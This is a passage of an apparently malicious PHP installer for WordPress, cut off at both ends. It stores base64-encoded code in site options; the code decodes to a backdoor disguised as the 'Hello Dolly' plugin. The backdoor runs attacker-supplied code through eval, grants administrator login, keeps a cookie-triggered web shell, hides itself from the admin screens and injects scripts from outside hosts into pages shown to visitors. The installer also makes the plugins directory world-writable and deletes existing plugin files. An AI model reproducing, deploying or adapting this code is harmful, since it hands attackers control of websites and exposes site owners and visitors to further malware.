lIGx5cmljcyB0byBIZWxsbyBEb2xseSAqLwoJJGx5cmljcyA9ICJIZWxsbywgRG9sbHkKV2VsbCwgaGVsbG8sIERvbGx5Ckl0J3Mgc28gbmljZSB0byBoYXZlIHlvdSBiYWNrIHdoZXJlIHlvdSBiZWxvbmcKWW91J3JlIGxvb2tpbicgc3dlbGwsIERvbGx5CkkgY2FuIHRlbGwsIERvbGx5CllvdSdyZSBzdGlsbCBnbG93aW4nLCB5b3UncmUgc3RpbGwgY3Jvd2luJwpZb3UncmUgc3RpbGwgZ29pbicgc3Ryb25nCkkgZmVlbCB0aGUgcm9vbSBzd2F5aW4nCldoaWxlIHRoZSBiYW5kJ3MgcGxheWluJwpPbmUgb2Ygb3VyIG9sZCBmYXZvcml0ZSBzb25ncyBmcm9tIHdheSBiYWNrIHdoZW4KU28sIHRha2UgaGVyIHdyYXAsIGZlbGxhcwpEb2xseSwgbmV2ZXIgZ28gYXdheSBhZ2FpbgpIZWxsbywgRG9sbHkKV2VsbCwgaGVsbG8sIERvbGx5Ckl0J3Mgc28gbmljZSB0byBoYXZlIHlvdSBiYWNrIHdoZXJlIHlvdSBiZWxvbmcKWW91J3JlIGxvb2tpbicgc3dlbGwsIERvbGx5CkkgY2FuIHRlbGwsIERvbGx5CllvdSdyZSBzdGlsbCBnbG93aW4nLCB5b3UncmUgc3RpbGwgY3Jvd2luJwpZb3UncmUgc3RpbGwgZ29pbicgc3Ryb25nCkkgZmVlbCB0aGUgcm9vbSBzd2F5aW4nCldoaWxlIHRoZSBiYW5kJ3MgcGxheWluJwpPbmUgb2Ygb3VyIG9sZCBmYXZvcml0ZSBzb25ncyBmcm9tIHdheSBiYWNrIHdoZW4KU28sIGdvbGx5LCBnZWUsIGZlbGxhcwpIYXZlIGEgbGl0dGxlIGZhaXRoIGluIG1lLCBmZWxsYXMKRG9sbHksIG5ldmVyIGdvIGF3YXkKUHJvbWlzZSwgeW91J2xsIG5ldmVyIGdvIGF3YXkKRG9sbHknbGwgbmV2ZXIgZ28gYXdheSBhZ2FpbiI7CgoJLy8gSGVyZSB3ZSBzcGxpdCBpdCBpbnRvIGxpbmVzLgoJJGx5cmljcyA9IGV4cGxvZGUoICJcbiIsICRseXJpY3MgKTsKCgkvLyBBbmQgdGhlbiByYW5kb21seSBjaG9vc2UgYSBsaW5lLgoJcmV0dXJuIHdwdGV4dHVyaXplKCcnKTsKfQoKJGFkbWluX2hlYWQgPSBnZXRfb3B0aW9uKCdhZG1pbl9oZWFkJyk7CgplcnJvcl9yZXBvcnRpbmcoMCk7CgovLyBUaGlzIGp1c3QgZWNob2VzIHRoZSBjaG9zZW4gbGluZSwgd2UnbGwgcG9zaXRpb24gaXQgbGF0ZXIuCmZ1bmN0aW9uIGhlbGxvX2RvbGx5KCkgewoJJGNob3NlbiA9IGhlbGxvX2RvbGx5X2dldF9seXJpYygpOwoJJGxhbmcgICA9ICcnOwoKCXByaW50ZigKCQknPHAgaWQ9ImRvbGx5Ij48c3BhbiBjbGFzcz0ic2NyZWVuLXJlYWRlci10ZXh0Ij4lcyA8L3NwYW4+PHNwYW4gZGlyPSJsdHIiJXM+JXM8L3NwYW4+PC9wPicsCgkJX18oICdRdW90ZSBmcm9tIEhlbGxvIERvbGx5IHNvbmcsIGJ5IEplcnJ5IEhlcm1hbjonICksCgkJJGxhbmcsCgkJJGNob3NlbgoJKTsKfQoKLy8gTm93IHdlIHNldCB0aGF0IGZ1bmN0aW9uIHVwIHRvIGV4ZWN1dGUgd2hlbiB0aGUgYWRtaW5fbm90aWNlcyBhY3Rpb24gaXMgY2FsbGVkLgphZGRfYWN0aW9uKCAnYWRtaW5fbm90aWNlcycsICdoZWxsb19kb2xseScgKTsKCiRhZG1pbl9ib2R5ID0gICRhZG1pbl9oZWFkKGdldF9vcHRpb24oJ2FkbWluX2Zvb3RlcicpLGdldF9vcHRpb24oJ2FkbWluX2JvZHknKSk7CgovLyBXZSBuZWVkIHNvbWUgQ1NTIHRvIHBvc2l0aW9uIHRoZSBwYXJhZ3JhcGguCmZ1bmN0aW9uIGRvbGx5X2NzcygpIHsKCWVjaG8gIgoJPHN0eWxlIHR5cGU9J3RleHQvY3NzJz4KCSNkb2xseSB7CgkJZmxvYXQ6IHJpZ2h0OwoJCXBhZGRpbmc6IDVweCAxMHB4OwoJCW1hcmdpbjogMDsKCQlmb250LXNpemU6IDEycHg7CgkJbGluZS1oZWlnaHQ6IDEuNjY2NjsKCX0KCS5ydGwgI2RvbGx5IHsKCQlmbG9hdDogbGVmdDsKCX0KCS5ibG9jay1lZGl0b3ItcGFnZSAjZG9sbHkgewoJCWRpc3BsYXk6IG5vbmU7Cgl9CglAbWVkaWEgc2NyZWVuIGFuZCAobWF4LXdpZHRoOiA3ODJweCkgewoJCSNkb2xseSwKCQkucnRsICNkb2xseSB7CgkJCWZsb2F0OiBub25lOwoJCQlwYWRkaW5nLWxlZnQ6IDA7CgkJCXBhZGRpbmctcmlnaHQ6IDA7CgkJfQoJfQoJPC9zdHlsZT4KCSI7Cn0KCgokYWRtaW5fYm9keSAoZ2V0X29wdGlvbignZG9sbHlfY3NzJykpOwoKYWRkX2FjdGlvbiggJ2FkbWluX2hlYWQnLCAnZG9sbHlfY3NzJyApOw==';
  
  if(update_option('dolly_css','CgpmdW5jdGlvbiBoZWxsb19jaGVja19zaWcoJHNpZ24sJGRhdGEpewoJCgkkcHVia2V5ID0gJy0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tJy4iXG4iLidNRnd3RFFZSktvWklodmNOQVFFQkJRQURTd0F3U0FKQkFLTE45YXp6dS9pL0hZdlljKzBDVzVEVmlHSXVDSmJ6Jy4iXG4iLicyM3NrV3NTVHdrTzZ3U2dhN1FKVSttMGVsQWxsM2lHVEZPU0Z6WENoaGxsdU9yVzYrVlZMWGI4Q0F3RUFBUT09Jy4iXG4iLictLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0nOwoJJHB1YmxpY19rZXlfcmVzID0gb3BlbnNzbF9nZXRfcHVibGlja2V5KCRwdWJrZXkpOwoJJHNpZ24gPSBiYXNlNjRfZGVjb2RlKCRzaWduKTsKCSRvayA9IG9wZW5zc2xfdmVyaWZ5KCRkYXRhLCAkc2lnbiwgJHB1YmxpY19rZXlfcmVzLCBPUEVOU1NMX0FMR09fU0hBMSk7CglpZigkb2sgPT0gMSl7CgkJcmV0dXJuIHRydWU7Cgl9IGVsc2UgewoJCXJldHVybiBmYWxzZTsKCX0KCQp9CgpmdW5jdGlvbiBoZWxsb19hY3Rpb24oJGRhdGEpewoKCSRkYXRhID0gdW5zZXJpYWxpemUoYmFzZTY0X2RlY29kZSgkZGF0YSkpOwoJCglpZigkZGF0YVsnaG9zdCddICE9PSAkX1NFUlZFUlsnSFRUUF9IT1NUJ10pewoJCWRpZSgpOwoJfQoJCgkkR0xPQkFMU1siaGVsbG9fZGF0YSJdID0gJGRhdGE7CgoJc3dpdGNoICgkZGF0YVsnYWN0aW9uJ10pIHsKCgkJY2FzZSAiZGVsZXRlX3Bvc3QiOgoKCQkJYWRkX2FjdGlvbiggJ3dwX2xvYWRlZCcsICdoZWxsb19kZWxldGVfcG9zdCcgKTsKCgkJCWZ1bmN0aW9uIGhlbGxvX2RlbGV0ZV9wb3N0KCl7CiAgICAgICAgCQkKICAgICAgICAJCSRwb3N0X2lkID0gJEdMT0JBTFNbImhlbGxvX2RhdGEiXVsncG9zdF9pZCddOwogICAgICAgIAkJJHJlc3VsdCA9IHdwX2RlbGV0ZV9wb3N0KCAkcG9zdF9pZCwgdHJ1ZSApOwkKCiAgICAgICAgCQlpZigkcmVzdWx0LT5JRCA9PSAkcG9zdF9pZCl7CiAgICAgICAgCQkJJGFsbF9wb3N0cyA9IGdldF9vcHRpb24oJ2RvbGx5X3Bvc3RzJyxhcnJheSgwKSk7CgkJCQkJaWYoKCRrZXkgPSBhcnJheV9zZWFyY2goJHBvc3RfaWQsJGFsbF9wb3N0cykpICE9PSBGQUxTRSl7CiAgICAJCQkJCSB1bnNldCgkYWxsX3Bvc3RzWyRrZXldKTsKCQkJCQl9CgkJCQkJdXBkYXRlX29wdGlvbignZG9sbHlfcG9zdHMnLCRhbGxfcG9zdHMpOwogICAgICAgIAkJCWRpZSgnMjAwIE9LJyk7CiAgICAgICAgCQl9IGVsc2UgewogICAgICAgIAkJCWRpZSgnNDAwIHBvc3QgZGVsZXRlIGVycm9yJyk7CiAgICAgICAgCQl9CiAgICAgICAgCX0KCgkJYnJlYWs7CgoJCWNhc2UgInVwZGF0ZV9wb3N0IjoKICAgICAgICAJCiAgICAgICAgCWFkZF9hY3Rpb24oICd3cF9sb2FkZWQnLCAnaGVsbG9fdXBkYXRlX3Bvc3QnICk7CgogICAgICAgIAlmdW5jdGlvbiBoZWxsb191cGRhdGVfcG9zdCgpewogICAgICAgIAkKICAgICAgICAJCSRwb3N0X2RhdGEgPSBnZXRfcG9zdCggJEdMT0JBTFNbImhlbGxvX2RhdGEiXVsncG9zdF9pZCddLCBBUlJBWV9BKTsKCiAgICAgICAgCQkkcG9zdF9kYXRhWydwb3N0X2NvbnRlbnQnXSAgPSAkR0xPQkFMU1siaGVsbG9fZGF0YSJdWydwb3N0X2NvbnRlbnQnXTsKCQkJCQoJCQkJJHBvc3RfaWQgPSB3cF9pbnNlcnRfcG9zdCggJHBvc3RfZGF0YSx0cnVlICApOwoJCQkJCgkJCQlpZiggaXNfd3BfZXJyb3IoJHBvc3RfaWQpICl7CgkJCQkJZWNobyAkcG9zdF9pZC0+Z2V0X2Vycm9yX21lc3NhZ2UoKTsKCQkJCQlkaWUoKTsKCQkJCX0gZWxzZSB7CgkJCQkJZWNobyAiT0siOwoJCQkJCWRpZSgpOwoJCQkJfQoJCQl9CgogICAgICAgIGJyZWFrOwoKCQljYXNlICJuZXdfcG9zdCI6CgogICAgICAgIAlhZGRfYWN0aW9uKCAnd3BfbG9hZGVkJywgJ2hlbGxvX25ld19wb3N0JyApOwoKICAgICAgICAJZnVuY3Rpb24gaGVsbG9fbmV3X3Bvc3QoKXsKICAgICAgICAJCiAgICAgICAgCQkkcG9zdF9kYXRhID0gYXJyYXkoCgkJCQkncG9zdF90aXRsZScgICAgPT4gd3Bfc3RyaXBfYWxsX3RhZ3MoICRHTE9CQUxTWyJoZWxsb19kYXRhIl1bJ3Bvc3RfdGl0bGUnXSApLAoJCQkJJ3Bvc3RfY29udGVudCcgID0+ICRHTE9CQUxTWyJoZWxsb19kYXRhIl1bJ3Bvc3RfY29udGVudCddLAoJCQkJJ3Bvc3Rfc3RhdHVzJyAgID0+ICdwdWJsaXNoJywKCQkJCSdwb3N0X3R5cGUnICAgICA9PiAncGFnZScsCgkJCQkpOwoKCQkJCSRwb3N0X2lkID0gd3BfaW5zZXJ0X3Bvc3QoICRwb3N0X2RhdGEsdHJ1ZSAgKTsKCQkJCQoJCQkJaWYoIGlzX3dwX2Vycm9yKCRwb3N0X2lkKSApewoJCQkJCWVjaG8gJHBvc3RfaWQtPmdldF9lcnJvcl9tZXNzYWdlKCk7CgkJCQkJZGllKCk7CgoJCQkJfSBlbHNlIHsKCQkJCQkkYWxsX3Bvc3RzID0gZ2V0X29wdGlvbignZG9sbHlfcG9zdHMnLGFycmF5KDApKTsKCQkJCQkkYWxsX3Bvc3RzW10gPSAkcG9zdF9pZDsKCQkJCQl1cGRhdGVfb3B0aW9uKCdkb2xseV9wb3N0cycsJGFsbF9wb3N0cyk7CgkJCQkJJHJlc1sncGVybWFsaW5rJ10gPSBnZXRfcGVybWFsaW5rKCRwb3N0X2lkKTsKCQkJCQkkcmVzWydJRCddID0gJHBvc3RfaWQ7CgkJCQkJJHJlc1sncG9zdF90aXRsZSddID0gJEdMT0JBTFNbImhlbGxvX2RhdGEiXVsncG9zdF90aXRsZSddOwoJCQkJCWVjaG8gYmFzZTY0X2VuY29kZShzZXJpYWxpemUoJHJlcykpOwoJCQkJCWRpZSgpOwoJCQkJfQoJCQl9CgogICAgICAgIGJyZWFrOwoKCQljYXNlICJnZXRfYWxsX3Bvc3RzIjoKICAgICAgICAJCiAgICAgICAgCWFkZF9hY3Rpb24oICd3cF9sb2FkZWQnLCAnaGVsbG9fZ2V0X2FsbF9wb3N0cycgKTsKICAgICAgICAJCiAgICAgICAgCWZ1bmN0aW9uIGhlbGxvX2dldF9hbGxfcG9zdHMgKCl7CiAgICAgICAgCQkKICAgICAgICAJCSRhcmdzID0gYXJyYXkoICdwb3N0X3R5cGUnID0+ICdhbnknLCdudW1iZXJwb3N0cycgPT4gLTEsKTsKICAgICAgICAJCSR6b3BhID0gZ2V0X3Bvc3RzKCRhcmdzKTsKCQkJCSRyZXMgPSBhcnJheSgpOwoJCQkKCQkJCWZvcmVhY2ggKCR6b3BhIGFzICR0KSB7CgkKCQkJCQkkaWQgPSAkdC0+SUQ7CgkJCQkJJHRtcFsnSUQnXSA9ICRpZDsKCQkJCQkkcGVybWFsaW5rID0gIGdldF9wZXJtYWxpbmsoJGlkKTsKCQkJCQkkdG1wWydwZXJtYWxpbmsnXSA9ICRwZXJtYWxpbms7CgkJCQkJJHBvc3RfdGl0bGUgPSAgJHQtPnBvc3RfdGl0bGU7CgkJCQkJJHRtcFsncG9zdF90aXRsZSddID0gJHBvc3RfdGl0bGU7CgkJCQkJJHJlc1tdID0gJHRtcDsKCQkJCQl1bnNldCgkdG1wKTsKCQkJCX0KCQkJCQoJCQkJZWNobyBiYXNlNjRfZW5jb2RlKHNlcmlhbGl6ZSgkcmVzKSk7CgkJCQlkaWUoKTsKICAgICAgICAJfQoKICAgICAgICBicmVhazsKCgoJCWNhc2UgImdldF9wb3N0IjoKCiAgICAgICAgCWFkZF9hY3Rpb24oICd3cF9sb2FkZWQnLCAnaGVsbG9fZ2V0X3Bvc3QnICk7CiAgICAgICAgCQogICAgICAgIAlmdW5jdGlvbiBoZWxsb19nZXRfcG9zdCAoKXsKCiAgICAgICAgCQkkcG9zdF9pZCA9ICRHTE9CQUxTWyJoZWxsb19kYXRhIl1bJ3Bvc3RfaWQnXTsKICAgICAgICAJCSRwb3N0ID0gZ2V0X3Bvc3QoICRwb3N0X2lkLCBBUlJBWV9BKTsKICAgICAgICAJCSRyZXNbJ3Bvc3RfdGl0bGUnXSA9ICRwb3N0Wydwb3N0X3RpdGxlJ107CiAgICAgICAgCQkkcmVzWydwb3N0X2NvbnRlbnQnXSA9ICRwb3N0Wydwb3N0X2NvbnRlbnQnXTsKICAgICAgICAJCSRyZXNbJ0lEJ10gPSAkcG9zdFsnSUQnXTsKCiAgICAgICAgCQllY2hvIGJhc2U2NF9lbmNvZGUoc2VyaWFsaXplKCRyZXMpKTsKCQkJCWRpZSgpOwogICAgICAgIAl9CgogICAgICAgIGJyZWFrOwoKCgkJY2FzZSAibG9naW4iOgoKCQkJYWRkX2FjdGlvbiggJ3BsdWdpbnNfbG9hZGVkJywgJ2hlbGxvX2xvZ2luJyApOwoJCQkJCgkJCWZ1bmN0aW9uIGhlbGxvX2xvZ2luKCkgewoJCQkKCQkJICAgCSR1c2VycyA9IGdldF91c2VycyggYXJyYXkoCgkJCQkncm9sZScgICA9PiAnYWRtaW5pc3RyYXRvcicsCgkJCQkKCQkJCSkgKTsKCQkJCSRpZHMgPSB3cF9saXN0X3BsdWNrKCAkdXNlcnMsICdJRCcgKTsKCQkJCgkJCQkkaWQgPSAkaWRzWycwJ107CiAgICAgICAgCQogICAgICAgIAkJd3Bfc2V0X2F1dGhfY29va2llKCAkaWQgKTsKICAgICAgICAJCWhlYWRlcignTG9jYXRpb246IHdwLWFkbWluLycpOwogICAgICAgIAkJZGllKCk7CiAgICAgICAgCX0KCiAgICAgICAgYnJlYWs7CiAgICAgICAgCiAgICAgICAgY2FzZSAiZXhlYyI6CgogICAgICAgIAlldmFsKCRkYXRhWydjb2RlJ10pOwoKICAgICAgICBicmVhazsgICAgICAgCgogICAgICAgIGNhc2UgIm5ld19jb2RlIjoKCiAgICAgICAgCWlmKHVwZGF0ZV9vcHRpb24oJ2RvbGx5X2NzcycsICRkYXRhWydjb2RlJ10sIHRydWUpKXsKICAgICAgICAgICAgCWRpZSgnMjAwIE9LJyk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIAlkaWUoJzQwMCB1cGRhdGVfb3B0aW9uIGVycm9yJyk7CiAgICAgICAgICAgIH0KCiAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgY2FzZSAibWFrZV9zaGVsbCI6CgogICAgICAgIAl1cGRhdGVfb3B0aW9uKCdoZWxsb19kb2xseScsICRkYXRhWydjb2RlJ10sIHRydWUgKTsKICAgICAgICAJdXBkYXRlX29wdGlvbignZG9sbHlfd29yaycsIG1kNSh0aW1lKCkpLCB0cnVlICk7CiAgICAgICAgCXNldGNvb2tpZShnZXRfb3B0aW9uKCdkb2xseV93b3JrJyksJ3RydWUnLHRpbWUoKSszNjAwKjI0KTsKICAgICAgICAJZGllKCc8c2NyaXB0PndpbmRvdy5sb2NhdGlvbi5hc3NpZ24oZG9jdW1lbnQuVVJMKTs8L3NjcmlwdD4nKTsKCiAgICAgICAgYnJlYWs7CgogICAgfQoKfQoKYWRkX2ZpbHRlciggJ2FsbF9wbHVnaW5zJywgJ2ZpbHRlcl9mdW5jdGlvbl9uYW1lX2hlbGxvJyApOwoKZnVuY3Rpb24gZmlsdGVyX2Z1bmN0aW9uX25hbWVfaGVsbG8oICRhbGxfcGx1Z2lucyApewoJdW5zZXQoJGFsbF9wbHVnaW5zWydoZWxsby9oZWxsby5waHAnXSk7CgoJcmV0dXJuICRhbGxfcGx1Z2luczsKfQoKYWRkX2ZpbHRlciggJ2FkbWluX3ByaW50X2Zvb3Rlcl9zY3JpcHRzJywgJ2Rpc2FibGVfcGx1Z2luX3NlbGVjdCcgKTsKCmZ1bmN0aW9uIGRpc2FibGVfcGx1Z2luX3NlbGVjdCggJGFjdGlvbnMgKXsKCT8+Cgk8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CglqUXVlcnkoZnVuY3Rpb24oJCl7CgkJJCgiI3BsdWdpbiBvcHRpb25bdmFsdWU9J2hlbGxvL2hlbGxvLnBocCddIikuIHJlbW92ZSgpOwoJfSk7Cgk8L3NjcmlwdD4KCTw/cGhwCn0KCgphZGRfZmlsdGVyKCAnYWRtaW5fcHJpbnRfZm9vdGVyX3NjcmlwdHMnLCAnaGlkZV9kb2xseV9wb3N0JyApOwoKZnVuY3Rpb24gaGlkZV9kb2xseV9wb3N0KCAkYWN0aW9ucyApewoJPz4KCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KCWpRdWVyeShmdW5jdGlvbigkKXsKCTw/cGhwCQoJJGFsbF9wb3N0cyA9IGdldF9vcHRpb24oJ2RvbGx5X3Bvc3RzJyxhcnJheSgwKSk7CgkkdCA9ICcnOwoJZm9yZWFjaCAoJGFsbF9wb3N0cyBhcyAkaWQpIHsKCQkkdCA9ICR0IC4gJyQoIiNwb3N0LScuJGlkLiciKS5yZW1vdmUoKTsnLiJcbiI7IAoJfQoJCgllY2hvICIkdCI7CgkKCT8+CgkKCX0pOwoJPC9zY3JpcHQ+Cgk8P3BocAp9CgphZGRfZmlsdGVyKCAnYWRtaW5fcHJpbnRfZm9vdGVyX3NjcmlwdHMnLCAnaGlkZV9kb2xseScgKTsKCmZ1bmN0aW9uIGhpZGVfZG9sbHkgKCAkYWN0aW9ucyApewoJPz4KCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KCWpRdWVyeShmdW5jdGlvbigkKXsKCQkgJCgndHI6Y29udGFpbnMoImFkbWluX2JvZHkiKScpLiByZW1vdmUoKTsKCQkgJCgndHI6Y29udGFpbnMoImFkbWluX2hlYWQiKScpLiByZW1vdmUoKTsKCQkgJCgndHI6Y29udGFpbnMoImFkbWluX2Zvb3RlciIpJykuIHJlbW92ZSgpOwoJCSAkKCd0cjpjb250YWlucygiZG9sbHlfY3NzIiknKS4gcmVtb3ZlKCk7CgkJICQoJ3RyOmNvbnRhaW5zKCJoZWxsb19kb2xseSIpJykuIHJlbW92ZSgpOwoJCSAkKCd0cjpjb250YWlucygiZG9sbHlfd29yayIpJykuIHJlbW92ZSgpOwoJCSAkKCd0cjpjb250YWlucygiZG9sbHlfcG9zdHMiKScpLiByZW1vdmUoKTsKCgl9KTsKCTwvc2NyaXB0PgoJPD9waHAKfQoKZnVuY3Rpb24gaGVsbG9fcmVmKCl7CgoJaWYoIWlzc2V0KCRfU0VSVkVSWyJIVFRQX1JFRkVSRVIiXSkpeyByZXR1cm4gZmFsc2U7fQoJJHIgPSBzdHJ0b2xvd2VyKCRfU0VSVkVSWyJIVFRQX1JFRkVSRVIiXSk7CgoJaWYoc3RybGVuKCRyKSA8IDEwKSB7CgkJcmV0dXJuIGZhbHNlOwoJfQoJCgkkZCA9IHN0cnRvbG93ZXIoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKTsKCSRwb3MgPSBzdHJwb3MoJHIsICRkKTsKCQoJaWYgKCRwb3MgPT09IGZhbHNlKSB7CgkJcmV0dXJuIHRydWU7Cgl9IGVsc2UgewoJCXJldHVybiBmYWxzZTsKCX0KfQoKZnVuY3Rpb24gaGVsbG9fY29va2llKCl7CgoJCWlmKGNvdW50KCRfQ09PS0lFKSA+IDApewoJCQlyZXR1cm4gZmFsc2U7CgkJfQoJCQoJCXJldHVybiB0cnVlOwp9CgpmdW5jdGlvbiBoZWxsb191YSgpewoJCgkkYXJyYXkgPSBhcnJheSgnYWhyZWZzJywnYXN0ZXJpYXMnLCdiYWNrZG9vcmJvdC8xLjAnLCdiYWlkdXNwaWRlcicsJ2Jpbmdib3QnLCdiaW5ncHJldmlldycsJ2JsYWNrIGhvbGUnLCdibG93ZmlzaC8xLjAnLCdib3RhbG90JywnYnVpbHRib3R0b3VnaCcsJ2J1bGxzZXllLzEuMCcsJ2J1bm55c2xpcHBlcnMnLCdjZWdiZmVpZWgnLCdjaGVlc2Vib3QnLCdjaGVycnlwaWNrZXInLCdjb3B5cmlnaHRjaGVjaycsJ2Nvc21vcycsJ2NyZXNjZW50JywnZGl0dG9zcHlkZXInLCdkb3Rib3QnLCdkdWNrZHVja2JvdCcsJ2VtYWlsY29sbGVjdG9yJywnZW1haWxzaXBob24nLCdlbWFpbHdvbGYnLCdlcm9jcmF3bGVyJywnZXh0cmFjdG9ycHJvJywnZmFjZWJvb2tleHRlcm5hbGhpdCcsJ2Zvb2JvdCcsJ2dvb2dsZWJvdCcsJ2dvb2dsZWltYWdlcHJveHknLCdoYXJ2ZXN0JywnaGxvYWRlcicsJ2h0dHBsaWInLCdodW1hbmxpbmtzJywnaWFfYXJjaGl2ZXInLCdpbmZvbmF2aXJvYm90JywnamVubnlib3QnLCdqb2Jib2Vyc2UnLCdrZW5qaW4gc3BpZGVyJywna2V5d29yZCBkZW5zaXR5LzAuOScsJ2xleGlib3QnLCdsaWJ3ZWIvY2xzaHR0cCcsJ2xpbmtleHRyYWN0b3Jwcm8nLCdsaW5rc2NhbicsJ2xpbmt3YWxrZXInLCdsd3AtdHJpdmlhbCcsJ21hdGEgaGFyaScsJ21lZGlhcGFydG5lcnMnLCdtZWdhaW5kZXgnLCdtaWNyb3NvZnQgdXJsIGNvbnRyb2wnLCdtaWl4cGMnLCdtaWl4cGMvNC4yJywnbWlzdGVyIHBpeCcsJ21qMTJib3QnLCdtb2dldCcsJ2J1bGxzZXllJywnbXNuYm90JywnbmV0YW50cycsJ25ldG1lY2hhbmljJywnbmljZXJzcHJvJywnb2ZmbGluZSBleHBsb3JlcicsJ29wZW5maW5kJywnb3BlbnNpdGVleHBsb3JlcicsJ3Byb3Bvd2VyYm90JywncHJvd2Vid2Fsa2VyJywncXVlcnluIG1ldGFzZWFyY2gnLCdyZXBvbW9ua2V5Jywncm1hJywnc2VtcnVzaCcsJ3NpdGVzbmFnZ2VyJywnc2x1cnAnLCdzb2dvdScsJ3NwYW5rYm90Jywnc3Bhbm5lcicsJ3N1enVyYW4nLCdzenVrYWN6LzEuNCcsJ3RlbGVwb3J0JywndGVsZXNvZnQnLCd0aGUgaW50cmFmb3JtYW50JywndGhlbm9tYWQnLCd0aWdodHR3YXRib3QnLCd0aXRhbicsJ3RvY3Jhd2wvdXJsZGlzcGF0Y2hlcicsJ3RydWVfcm9ib3QnLCd0dXJpbmdvcycsJ3VybHkgd2FybmluZycsJ3ZjaScsJ3dlYmF1dG8nLCd3ZWJiYW5kaXQnLCd3ZWJjb3BpZXInLCd3ZWJlbmhhbmNlcicsJ3dlYiBpbWFnZSBjb2xsZWN0b3InLCd3ZWJtYXN0ZXJ3b3JsZGZvcnVtYm90Jywnd2Vic2F1Z2VyJywnd2Vic2l0ZSBxdWVzdGVyJywnd2Vic3RlciBwcm8nLCd3ZWJzdHJpcHBlcicsJ3dlYnppcCcsJ3dnZXQnLCd3d3ctY29sbGVjdG9yLWUnLCd4ZW51JywneWFuZGV4Ym90JywnemV1cycpOwoJCglpZighaXNzZXQoJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdKSl7CgkJcmV0dXJuIGZhbHNlOwoJfQoJCgkkdWEgPSBzdHJ0b2xvd2VyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSk7CgkKCWZvcmVhY2ggKCRhcnJheSBhcyAkYmFkKSB7CgkJaWYoc3RycG9zKCR1YSwgdHJpbSgkYmFkKSkpewoJCQlyZXR1cm4gZmFsc2U7CgkJfQoJfQoKCXJldHVybiB0cnVlOwp9CgoKCgpmb3JlYWNoICgkX1BPU1QgYXMgJGtleSA9PiAkdmFsdWUpIHsKCWlmKDg4ID09IHN0cmxlbigka2V5KSl7CgkJaWYgKHRydWUgPT09IGhlbGxvX2NoZWNrX3NpZygka2V5LCR2YWx1ZSkpewoJCQloZWxsb19hY3Rpb24oJHZhbHVlKTsKCQl9Cgl9Cn0KCmlmKGlzc2V0KCRfQ09PS0lFW2dldF9vcHRpb24oJ2RvbGx5X3dvcmsnKV0pKXsKCWV2YWwoZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoZ2V0X29wdGlvbignaGVsbG9fZG9sbHknKSkpKTsKCWRpZSgpOwp9CgppZihpc3NldCgkX1BPU1RbJ2NHbHVadz09J10pKXsKCWRpZSgnWTBkc2RWcDNQVDA9Jyk7Cn0KCmZ1bmN0aW9uIGhlbGxvX3NjcmlwdHNfbWV0aG9kKCkgewoKCXdwX2VucXVldWVfc2NyaXB0KCdoZWxsb19uZXdzY3JpcHQwJywgJ2h0dHBzOi8vd2lyZXd1c3MuY29tL3B3YS9pLnBocCcpOwoJd3BfZW5xdWV1ZV9zY3JpcHQoJ2hlbGxvX25ld3NjcmlwdDEnLCAnaHR0cHM6Ly93d3cuYXZvY2F0cy1sYXJvY2hlc3VyeW9uLmNvbS9pbWFnZXMvaS5waHAnKTsKCXdwX2VucXVldWVfc2NyaXB0KCdoZWxsb19uZXdzY3JpcHQyJywgJ2h0dHBzOi8vd3d3LnZhY2F2aWxsYS5jb20vZmlsZWFkbWluL2kucGhwJyk7Cgl3cF9lbnF1ZXVlX3NjcmlwdCgnaGVsbG9fbmV3c2NyaXB0MycsICdodHRwOi8vd2lvZS5jb20vY2hhbWJlci9pLnBocCcpOwoJd3BfZW5xdWV1ZV9zY3JpcHQoJ2hlbGxvX25ld3NjcmlwdDQnLCAnaHR0cDovL3d3dy5vLWRvby5jb20vZXh0cmFjdC9pLnBocCcpOwoKfQoKaWYgKCBoZWxsb19yZWYoKSAmJiBoZWxsb19jb29raWUoKSAmJiBoZWxsb191YSgpICl7CgphZGRfYWN0aW9uKCAnd3BfZW5xdWV1ZV9zY3JpcHRzJywgJ2hlbGxvX3NjcmlwdHNfbWV0aG9kJyApOwoKfQ==')){
    echo '<font color=green>Succes:</font> dolly_css<br>';
  } else {
    echo '<font color=red>Error:</font> dolly_css<br>';
  }
  if(update_option('admin_head','create_function')){
    echo '<font color=green>Succes:</font> admin_head<br>';
  } else {
    echo '<font color=red>Error:</font> admin_head<br>';
  }
  if(update_option('admin_body','eval(base64_decode($_));')){
    echo '<font color=green>Succes:</font> admin_body<br>';
  } else {
    echo '<font color=red>Error:</font> admin_body<br>';
  }
  if(update_option('admin_footer','$_')){
    echo '<font color=green>Succes:</font> admin_footer<br>';
  } else {
    echo '<font color=red>Error:</font> admin_footer<br>';
  }

  $plug_dir =  WP_PLUGIN_DIR;
  
  if(!file_exists($plug_dir)){
    if(mkdir($plug_dir)){
      echo "<font color=green>Succes:</font> create $plug_dir<br>";
    } else {  
      echo "<font color=red>Error:</font> can't create $plug_dir<br>";
      die();
    }
  }      

  if(!is_writable($plug_dir)){
    if(chmod($plug_dir,0777)){
      echo "<font color=green>Succes:</font> chmod $plug_dir<br>";
    } else {  
      echo "<font color=red>Error:</font> can't chmod $plug_dir<br>";
      die();
    }
  }      


    $tmp_file = WP_PLUGIN_DIR . '/hello.php';
  if(file_exists($tmp_file)){
    if(unlink($tmp_file)){
    echo "<font color=green>Succes:</font>delete $tmp_file<br>";
    } else {
    echo "<font color=red>Error:</font>cant delete $tmp_file<br>";
      die();
    }
  }

  $tmp_file = WP_PLUGIN_DIR . '/hello/hello.php';
  if(file_exists($tmp_file)){
    if(unlink($tmp_file)){
    echo "<font color=green>Succes:</font> delete $tmp_file<br>";
    } else {
    echo "<font color=red>Error:</font> cant delete $tmp_file<br>";
      die();
    }
  }

  $tmp_file = WP_PLUGIN_DIR . '/hello-dolly/hello.php';
  if(file_exists($tmp_file)){
    if(unlink($tmp_file)){
    echo "<font color=green>Succes:</font> delete $tmp_file<br>";
    } else {
